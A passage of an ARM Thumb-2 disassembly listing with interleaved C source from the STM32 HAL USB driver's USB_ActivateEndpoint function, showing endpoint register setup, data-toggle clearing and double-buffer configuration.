 80060ea:	b29b      	uxth	r3, r3
 80060ec:	461a      	mov	r2, r3
 80060ee:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80060f0:	4413      	add	r3, r2
 80060f2:	62bb      	str	r3, [r7, #40]	; 0x28
 80060f4:	683b      	ldr	r3, [r7, #0]
 80060f6:	781b      	ldrb	r3, [r3, #0]
 80060f8:	00da      	lsls	r2, r3, #3
 80060fa:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80060fc:	4413      	add	r3, r2
 80060fe:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006102:	627b      	str	r3, [r7, #36]	; 0x24
 8006104:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006106:	881b      	ldrh	r3, [r3, #0]
 8006108:	b29b      	uxth	r3, r3
 800610a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800610e:	b29a      	uxth	r2, r3
 8006110:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006112:	801a      	strh	r2, [r3, #0]
 8006114:	683b      	ldr	r3, [r7, #0]
 8006116:	691b      	ldr	r3, [r3, #16]
 8006118:	2b3e      	cmp	r3, #62	; 0x3e
 800611a:	d91d      	bls.n	8006158 <USB_ActivateEndpoint+0x2b0>
 800611c:	683b      	ldr	r3, [r7, #0]
 800611e:	691b      	ldr	r3, [r3, #16]
 8006120:	095b      	lsrs	r3, r3, #5
 8006122:	66bb      	str	r3, [r7, #104]	; 0x68
 8006124:	683b      	ldr	r3, [r7, #0]
 8006126:	691b      	ldr	r3, [r3, #16]
 8006128:	f003 031f 	and.w	r3, r3, #31
 800612c:	2b00      	cmp	r3, #0
 800612e:	d102      	bne.n	8006136 <USB_ActivateEndpoint+0x28e>
 8006130:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006132:	3b01      	subs	r3, #1
 8006134:	66bb      	str	r3, [r7, #104]	; 0x68
 8006136:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006138:	881b      	ldrh	r3, [r3, #0]
 800613a:	b29a      	uxth	r2, r3
 800613c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800613e:	b29b      	uxth	r3, r3
 8006140:	029b      	lsls	r3, r3, #10
 8006142:	b29b      	uxth	r3, r3
 8006144:	4313      	orrs	r3, r2
 8006146:	b29b      	uxth	r3, r3
 8006148:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800614c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006150:	b29a      	uxth	r2, r3
 8006152:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006154:	801a      	strh	r2, [r3, #0]
 8006156:	e026      	b.n	80061a6 <USB_ActivateEndpoint+0x2fe>
 8006158:	683b      	ldr	r3, [r7, #0]
 800615a:	691b      	ldr	r3, [r3, #16]
 800615c:	2b00      	cmp	r3, #0
 800615e:	d10a      	bne.n	8006176 <USB_ActivateEndpoint+0x2ce>
 8006160:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006162:	881b      	ldrh	r3, [r3, #0]
 8006164:	b29b      	uxth	r3, r3
 8006166:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800616a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800616e:	b29a      	uxth	r2, r3
 8006170:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006172:	801a      	strh	r2, [r3, #0]
 8006174:	e017      	b.n	80061a6 <USB_ActivateEndpoint+0x2fe>
 8006176:	683b      	ldr	r3, [r7, #0]
 8006178:	691b      	ldr	r3, [r3, #16]
 800617a:	085b      	lsrs	r3, r3, #1
 800617c:	66bb      	str	r3, [r7, #104]	; 0x68
 800617e:	683b      	ldr	r3, [r7, #0]
 8006180:	691b      	ldr	r3, [r3, #16]
 8006182:	f003 0301 	and.w	r3, r3, #1
 8006186:	2b00      	cmp	r3, #0
 8006188:	d002      	beq.n	8006190 <USB_ActivateEndpoint+0x2e8>
 800618a:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800618c:	3301      	adds	r3, #1
 800618e:	66bb      	str	r3, [r7, #104]	; 0x68
 8006190:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006192:	881b      	ldrh	r3, [r3, #0]
 8006194:	b29a      	uxth	r2, r3
 8006196:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006198:	b29b      	uxth	r3, r3
 800619a:	029b      	lsls	r3, r3, #10
 800619c:	b29b      	uxth	r3, r3
 800619e:	4313      	orrs	r3, r2
 80061a0:	b29a      	uxth	r2, r3
 80061a2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061a4:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80061a6:	687a      	ldr	r2, [r7, #4]
 80061a8:	683b      	ldr	r3, [r7, #0]
 80061aa:	781b      	ldrb	r3, [r3, #0]
 80061ac:	009b      	lsls	r3, r3, #2
 80061ae:	4413      	add	r3, r2
 80061b0:	881b      	ldrh	r3, [r3, #0]
 80061b2:	847b      	strh	r3, [r7, #34]	; 0x22
 80061b4:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 80061b6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80061ba:	2b00      	cmp	r3, #0
 80061bc:	d01b      	beq.n	80061f6 <USB_ActivateEndpoint+0x34e>
 80061be:	687a      	ldr	r2, [r7, #4]
 80061c0:	683b      	ldr	r3, [r7, #0]
 80061c2:	781b      	ldrb	r3, [r3, #0]
 80061c4:	009b      	lsls	r3, r3, #2
 80061c6:	4413      	add	r3, r2
 80061c8:	881b      	ldrh	r3, [r3, #0]
 80061ca:	b29b      	uxth	r3, r3
 80061cc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80061d0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061d4:	843b      	strh	r3, [r7, #32]
 80061d6:	687a      	ldr	r2, [r7, #4]
 80061d8:	683b      	ldr	r3, [r7, #0]
 80061da:	781b      	ldrb	r3, [r3, #0]
 80061dc:	009b      	lsls	r3, r3, #2
 80061de:	441a      	add	r2, r3
 80061e0:	8c3b      	ldrh	r3, [r7, #32]
 80061e2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80061e6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80061ea:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80061ee:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80061f2:	b29b      	uxth	r3, r3
 80061f4:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 80061f6:	683b      	ldr	r3, [r7, #0]
 80061f8:	781b      	ldrb	r3, [r3, #0]
 80061fa:	2b00      	cmp	r3, #0
 80061fc:	d124      	bne.n	8006248 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80061fe:	687a      	ldr	r2, [r7, #4]
 8006200:	683b      	ldr	r3, [r7, #0]
 8006202:	781b      	ldrb	r3, [r3, #0]
 8006204:	009b      	lsls	r3, r3, #2
 8006206:	4413      	add	r3, r2
 8006208:	881b      	ldrh	r3, [r3, #0]
 800620a:	b29b      	uxth	r3, r3
 800620c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006210:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006214:	83bb      	strh	r3, [r7, #28]
 8006216:	8bbb      	ldrh	r3, [r7, #28]
 8006218:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800621c:	83bb      	strh	r3, [r7, #28]
 800621e:	8bbb      	ldrh	r3, [r7, #28]
 8006220:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006224:	83bb      	strh	r3, [r7, #28]
 8006226:	687a      	ldr	r2, [r7, #4]
 8006228:	683b      	ldr	r3, [r7, #0]
 800622a:	781b      	ldrb	r3, [r3, #0]
 800622c:	009b      	lsls	r3, r3, #2
 800622e:	441a      	add	r2, r3
 8006230:	8bbb      	ldrh	r3, [r7, #28]
 8006232:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006236:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800623a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800623e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006242:	b29b      	uxth	r3, r3
 8006244:	8013      	strh	r3, [r2, #0]
 8006246:	e1ea      	b.n	800661e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 8006248:	687a      	ldr	r2, [r7, #4]
 800624a:	683b      	ldr	r3, [r7, #0]
 800624c:	781b      	ldrb	r3, [r3, #0]
 800624e:	009b      	lsls	r3, r3, #2
 8006250:	4413      	add	r3, r2
 8006252:	881b      	ldrh	r3, [r3, #0]
 8006254:	b29b      	uxth	r3, r3
 8006256:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800625a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800625e:	83fb      	strh	r3, [r7, #30]
 8006260:	8bfb      	ldrh	r3, [r7, #30]
 8006262:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006266:	83fb      	strh	r3, [r7, #30]
 8006268:	687a      	ldr	r2, [r7, #4]
 800626a:	683b      	ldr	r3, [r7, #0]
 800626c:	781b      	ldrb	r3, [r3, #0]
 800626e:	009b      	lsls	r3, r3, #2
 8006270:	441a      	add	r2, r3
 8006272:	8bfb      	ldrh	r3, [r7, #30]
 8006274:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006278:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800627c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006280:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006284:	b29b      	uxth	r3, r3
 8006286:	8013      	strh	r3, [r2, #0]
 8006288:	e1c9      	b.n	800661e <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 800628a:	683b      	ldr	r3, [r7, #0]
 800628c:	78db      	ldrb	r3, [r3, #3]
 800628e:	2b02      	cmp	r3, #2
 8006290:	d11e      	bne.n	80062d0 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006292:	687a      	ldr	r2, [r7, #4]
 8006294:	683b      	ldr	r3, [r7, #0]
 8006296:	781b      	ldrb	r3, [r3, #0]
 8006298:	009b      	lsls	r3, r3, #2
 800629a:	4413      	add	r3, r2
 800629c:	881b      	ldrh	r3, [r3, #0]
 800629e:	b29b      	uxth	r3, r3
 80062a0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80062a4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062a8:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 80062ac:	687a      	ldr	r2, [r7, #4]
 80062ae:	683b      	ldr	r3, [r7, #0]
 80062b0:	781b      	ldrb	r3, [r3, #0]
 80062b2:	009b      	lsls	r3, r3, #2
 80062b4:	441a      	add	r2, r3
 80062b6:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80062ba:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062be:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062c2:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 80062c6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062ca:	b29b      	uxth	r3, r3
 80062cc:	8013      	strh	r3, [r2, #0]
 80062ce:	e01d      	b.n	800630c <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 80062d0:	687a      	ldr	r2, [r7, #4]
 80062d2:	683b      	ldr	r3, [r7, #0]
 80062d4:	781b      	ldrb	r3, [r3, #0]
 80062d6:	009b      	lsls	r3, r3, #2
 80062d8:	4413      	add	r3, r2
 80062da:	881b      	ldrh	r3, [r3, #0]
 80062dc:	b29b      	uxth	r3, r3
 80062de:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 80062e2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062e6:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 80062ea:	687a      	ldr	r2, [r7, #4]
 80062ec:	683b      	ldr	r3, [r7, #0]
 80062ee:	781b      	ldrb	r3, [r3, #0]
 80062f0:	009b      	lsls	r3, r3, #2
 80062f2:	441a      	add	r2, r3
 80062f4:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 80062f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006300:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006304:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006308:	b29b      	uxth	r3, r3
 800630a:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 800630c:	687b      	ldr	r3, [r7, #4]
 800630e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006310:	687b      	ldr	r3, [r7, #4]
 8006312:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006316:	b29b      	uxth	r3, r3
 8006318:	461a      	mov	r2, r3
 800631a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800631c:	4413      	add	r3, r2
 800631e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006320:	683b      	ldr	r3, [r7, #0]
 8006322:	781b      	ldrb	r3, [r3, #0]
 8006324:	00da      	lsls	r2, r3, #3
 8006326:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006328:	4413      	add	r3, r2
 800632a:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800632e:	65bb      	str	r3, [r7, #88]	; 0x58
 8006330:	683b      	ldr	r3, [r7, #0]
 8006332:	891b      	ldrh	r3, [r3, #8]
 8006334:	085b      	lsrs	r3, r3, #1
 8006336:	b29b      	uxth	r3, r3
 8006338:	005b      	lsls	r3, r3, #1
 800633a:	b29a      	uxth	r2, r3
 800633c:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800633e:	801a      	strh	r2, [r3, #0]
 8006340:	687b      	ldr	r3, [r7, #4]
 8006342:	657b      	str	r3, [r7, #84]	; 0x54
 8006344:	687b      	ldr	r3, [r7, #4]
 8006346:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800634a:	b29b      	uxth	r3, r3
 800634c:	461a      	mov	r2, r3
 800634e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006350:	4413      	add	r3, r2
 8006352:	657b      	str	r3, [r7, #84]	; 0x54
 8006354:	683b      	ldr	r3, [r7, #0]
 8006356:	781b      	ldrb	r3, [r3, #0]
 8006358:	00da      	lsls	r2, r3, #3
 800635a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800635c:	4413      	add	r3, r2
 800635e:	f203 4304 	addw	r3, r3, #1028	; 0x404
 8006362:	653b      	str	r3, [r7, #80]	; 0x50
 8006364:	683b      	ldr	r3, [r7, #0]
 8006366:	895b      	ldrh	r3, [r3, #10]
 8006368:	085b      	lsrs	r3, r3, #1
 800636a:	b29b      	uxth	r3, r3
 800636c:	005b      	lsls	r3, r3, #1
 800636e:	b29a      	uxth	r2, r3
 8006370:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8006372:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 8006374:	683b      	ldr	r3, [r7, #0]
 8006376:	785b      	ldrb	r3, [r3, #1]
 8006378:	2b00      	cmp	r3, #0
 800637a:	f040 8093 	bne.w	80064a4 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800637e:	687a      	ldr	r2, [r7, #4]
 8006380:	683b      	ldr	r3, [r7, #0]
 8006382:	781b      	ldrb	r3, [r3, #0]
 8006384:	009b      	lsls	r3, r3, #2
 8006386:	4413      	add	r3, r2
 8006388:	881b      	ldrh	r3, [r3, #0]
 800638a:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 800638e:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8006392:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006396:	2b00      	cmp	r3, #0
 8006398:	d01b      	beq.n	80063d2 <USB_ActivateEndpoint+0x52a>
 800639a:	687a      	ldr	r2, [r7, #4]
 800639c:	683b      	ldr	r3, [r7, #0]
 800639e:	781b      	ldrb	r3, [r3, #0]
 80063a0:	009b      	lsls	r3, r3, #2
 80063a2:	4413      	add	r3, r2
 80063a4:	881b      	ldrh	r3, [r3, #0]
 80063a6:	b29b      	uxth	r3, r3
 80063a8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063ac:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063b0:	87fb      	strh	r3, [r7, #62]	; 0x3e
 80063b2:	687a      	ldr	r2, [r7, #4]
 80063b4:	683b      	ldr	r3, [r7, #0]
 80063b6:	781b      	ldrb	r3, [r3, #0]
 80063b8:	009b      	lsls	r3, r3, #2
 80063ba:	441a      	add	r2, r3
 80063bc:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 80063be:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80063c2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80063c6:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80063ca:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80063ce:	b29b      	uxth	r3, r3
 80063d0:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80063d2:	687a      	ldr	r2, [r7, #4]
 80063d4:	683b      	ldr	r3, [r7, #0]
 80063d6:	781b      	ldrb	r3, [r3, #0]
 80063d8:	009b      	lsls	r3, r3, #2
 80063da:	4413      	add	r3, r2
 80063dc:	881b      	ldrh	r3, [r3, #0]
 80063de:	87bb      	strh	r3, [r7, #60]	; 0x3c
 80063e0:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 80063e2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80063e6:	2b00      	cmp	r3, #0
 80063e8:	d01b      	beq.n	8006422 <USB_ActivateEndpoint+0x57a>
 80063ea:	687a      	ldr	r2, [r7, #4]
 80063ec:	683b      	ldr	r3, [r7, #0]
 80063ee:	781b      	ldrb	r3, [r3, #0]
 80063f0:	009b      	lsls	r3, r3, #2
 80063f2:	4413      	add	r3, r2
 80063f4:	881b      	ldrh	r3, [r3, #0]
 80063f6:	b29b      	uxth	r3, r3
 80063f8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063fc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006400:	877b      	strh	r3, [r7, #58]	; 0x3a
 8006402:	687a      	ldr	r2, [r7, #4]
 8006404:	683b      	ldr	r3, [r7, #0]
 8006406:	781b      	ldrb	r3, [r3, #0]
 8006408:	009b      	lsls	r3, r3, #2
 800640a:	441a      	add	r2, r3
 800640c:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 800640e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006412:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006416:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800641a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800641e:	b29b      	uxth	r3, r3
 8006420:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8006422:	687a      	ldr	r2, [r7, #4]
 8006424:	683b      	ldr	r3, [r7, #0]
 8006426:	781b      	ldrb	r3, [r3, #0]
 8006428:	009b      	lsls	r3, r3, #2
 800642a:	4413      	add	r3, r2
 800642c:	881b      	ldrh	r3, [r3, #0]
 800642e:	b29b      	uxth	r3, r3
 8006430:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006434:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006438:	873b      	strh	r3, [r7, #56]	; 0x38
 800643a:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 800643c:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006440:	873b      	strh	r3, [r7, #56]	; 0x38
 8006442:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006444:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006448:	873b      	strh	r3, [r7, #56]	; 0x38
 800644a:	687a      	ldr	r2, [r7, #4]
 800644c:	683b      	ldr	r3, [r7, #0]
 800644e:	781b      	ldrb	r3, [r3, #0]
 8006450:	009b      	lsls	r3, r3, #2
 8006452:	441a      	add	r2, r3
 8006454:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006456:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800645a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800645e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006462:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006466:	b29b      	uxth	r3, r3
 8006468:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800646a:	687a      	ldr	r2, [r7, #4]
 800646c:	683b      	ldr	r3, [r7, #0]
 800646e:	781b      	ldrb	r3, [r3, #0]
 8006470:	009b      	lsls	r3, r3, #2
 8006472:	4413      	add	r3, r2
 8006474:	881b      	ldrh	r3, [r3, #0]
 8006476:	b29b      	uxth	r3, r3
 8006478:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800647c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006480:	86fb      	strh	r3, [r7, #54]	; 0x36
 8006482:	687a      	ldr	r2, [r7, #4]
 8006484:	683b      	ldr	r3, [r7, #0]
 8006486:	781b      	ldrb	r3, [r3, #0]
 8006488:	009b      	lsls	r3, r3, #2
 800648a:	441a      	add	r2, r3
 800648c:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 800648e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006492:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006496:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800649a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800649e:	b29b      	uxth	r3, r3
 80064a0:	8013      	strh	r3, [r2, #0]
 80064a2:	e0bc      	b.n	800661e <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80064a4:	687a      	ldr	r2, [r7, #4]
 80064a6:	683b      	ldr	r3, [r7, #0]
 80064a8:	781b      	ldrb	r3, [r3, #0]
 80064aa:	009b      	lsls	r3, r3, #2
 80064ac:	4413      	add	r3, r2
 80064ae:	881b      	ldrh	r3, [r3, #0]
 80064b0:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80064b4:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80064b8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80064bc:	2b00      	cmp	r3, #0
 80064be:	d01d      	beq.n	80064fc <USB_ActivateEndpoint+0x654>
 80064c0:	687a      	ldr	r2, [r7, #4]
 80064c2:	683b      	ldr	r3, [r7, #0]
 80064c4:	781b      	ldrb	r3, [r3, #0]
 80064c6:	009b      	lsls	r3, r3, #2
 80064c8:	4413      	add	r3, r2
 80064ca:	881b      	ldrh	r3, [r3, #0]
 80064cc:	b29b      	uxth	r3, r3
 80064ce:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80064d2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064d6:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 80064da:	687a      	ldr	r2, [r7, #4]
 80064dc:	683b      	ldr	r3, [r7, #0]
 80064de:	781b      	ldrb	r3, [r3, #0]
 80064e0:	009b      	lsls	r3, r3, #2
 80064e2:	441a      	add	r2, r3
 80064e4:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 80064e8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064ec:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064f0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80064f4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064f8:	b29b      	uxth	r3, r3
 80064fa:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80064fc:	687a      	ldr	r2, [r7, #4]
 80064fe:	683b      	ldr	r3, [r7, #0]
 8006500:	781b      	ldrb	r3, [r3, #0]
 8006502:	009b      	lsls	r3, r3, #2
 8006504:	4413      	add	r3, r2
 8006506:	881b      	ldrh	r3, [r3, #0]
 8006508:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 800650c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8006510:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006514:	2b00      	cmp	r3, #0
 8006516:	d01d      	beq.n	8006554 <USB_ActivateEndpoint+0x6ac>
 8006518:	687a      	ldr	r2, [r7, #4]
 800651a:	683b      	ldr	r3, [r7, #0]
 800651c:	781b      	ldrb	r3, [r3, #0]
 800651e:	009b      	lsls	r3, r3, #2
 8006520:	4413      	add	r3, r2
 8006522:	881b      	ldrh	r3, [r3, #0]
 8006524:	b29b      	uxth	r3, r3
 8006526:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800652a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800652e:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8006532:	687a      	ldr	r2, [r7, #4]
 8006534:	683b      	ldr	r3, [r7, #0]
 8006536:	781b      	ldrb	r3, [r3, #0]
 8006538:	009b      	lsls	r3, r3, #2
 800653a:	441a      	add	r2, r3
 800653c:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 8006540:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006544:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006548:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800654c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006550:	b29b      	uxth	r3, r3
 8006552:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006554:	683b      	ldr	r3, [r7, #0]
 8006556:	78db      	ldrb	r3, [r3, #3]
 8006558:	2b01      	cmp	r3, #1
 800655a:	d024      	beq.n	80065a6 <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 800655c:	687a      	ldr	r2, [r7, #4]
 800655e:	683b      	ldr	r3, [r7, #0]
 8006560:	781b      	ldrb	r3, [r3, #0]
 8006562:	009b      	lsls	r3, r3, #2
 8006564:	4413      	add	r3, r2
 8006566:	881b      	ldrh	r3, [r3, #0]
 8006568:	b29b      	uxth	r3, r3
 800656a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800656e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006572:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006576:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 800657a:	f083 0320 	eor.w	r3, r3, #32
 800657e:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006582:	687a      	ldr	r2, [r7, #4]
 8006584:	683b      	ldr	r3, [r7, #0]
 8006586:	781b      	ldrb	r3, [r3, #0]
 8006588:	009b      	lsls	r3, r3, #2
 800658a:	441a      	add	r2, r3
 800658c:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006590:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006594:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006598:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800659c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065a0:	b29b      	uxth	r3, r3
 80065a2:	8013      	strh	r3, [r2, #0]
 80065a4:	e01d      	b.n	80065e2 <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80065a6:	687a      	ldr	r2, [r7, #4]
 80065a8:	683b      	ldr	r3, [r7, #0]
 80065aa:	781b      	ldrb	r3, [r3, #0]
 80065ac:	009b      	lsls	r3, r3, #2
 80065ae:	4413      	add	r3, r2
 80065b0:	881b      	ldrh	r3, [r3, #0]
 80065b2:	b29b      	uxth	r3, r3
 80065b4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065b8:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80065bc:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 80065c0:	687a      	ldr	r2, [r7, #4]
 80065c2:	683b      	ldr	r3, [r7, #0]
 80065c4:	781b      	ldrb	r3, [r3, #0]
 80065c6:	009b      	lsls	r3, r3, #2
